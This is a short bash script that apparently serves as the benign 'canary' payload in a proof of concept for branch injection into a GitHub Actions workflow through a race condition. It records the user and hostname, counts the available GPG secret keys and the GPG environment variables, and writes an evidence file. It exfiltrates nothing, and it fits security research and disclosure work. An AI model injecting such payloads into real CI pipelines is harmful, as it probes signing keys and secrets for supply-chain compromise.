#!/bin/bash
# Canary proof — benign, proves execution context
echo "## PoC: Race Condition Branch Injection" >> $GITHUB_STEP_SUMMARY
echo "- Executed by: $(whoami)" >> $GITHUB_STEP_SUMMARY
echo "- Hostname: $(hostname)" >> $GITHUB_STEP_SUMMARY
echo "- GPG keys available: $(gpg --list-secret-keys 2>/dev/null | grep -c sec)" >> $GITHUB_STEP_SUMMARY
echo "- Secrets in env: $(env | grep -c GPG)" >> $GITHUB_STEP_SUMMARY
echo "CANARY_PROOF=true" > /tmp/poc_evidence.txt
